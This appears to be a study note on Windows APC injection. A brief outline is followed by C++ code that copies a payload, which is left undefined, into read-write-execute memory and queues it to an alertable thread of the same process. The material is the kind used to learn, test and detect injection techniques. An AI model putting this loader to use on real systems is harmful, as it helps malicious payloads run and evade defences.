# APC Injection

APC = Asynchronous Procedure Call, Run in specific thread context, Can be scheduled, Only **Alertable** threads can execute APCs.

Basically, 

1. either a new thread is created in suspended / alertable state or an existing thread is put in alertable state
2. payload is injected to memory 
3. then an APC is queued to the thread to execute the payload.

VOID CALLBACK MyApcFunction(ULONG_PTR dwParam) {
    const char* message = reinterpret_cast<const char*>(dwParam);
    std::cout << "[*] APC Function Executed: " << message << std::endl;
}

VOID AlertableFunction() {
	SleepEx(INFINITE, TRUE);
}

BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;

	
	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(pAddress, pPayload, sPayloadSize);
	

	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\t[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// If hThread is in an alertable state, QueueUserAPC will run the payload directly
	// If hThread is in a suspended state, the payload won't be executed unless the thread is resumed after
	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

int main() {

    HANDLE hThread = NULL;

    // Create a thread in alertable state
    hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)AlertableFunction,
        NULL,
        0,
        NULL
    );

    if (hThread == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return EXIT_FAILURE;
    }

    printf("[*] Created alertable thread with TID : %d \n", GetThreadId(hThread));

    // Inject and run the payload via APC injection
    if (!RunViaApcInjection(hThread, Payload, sizeof(Payload))) {
        printf("[!] APC Injection Failed \n");
        CloseHandle(hThread);
        return EXIT_FAILURE;
    }

    printf("[*] Successfully queued APC to the alertable thread. \n");

    // Wait for some time to let the payload execute
    Sleep(5000);

    CloseHandle(hThread);
    return EXIT_SUCCESS;
}
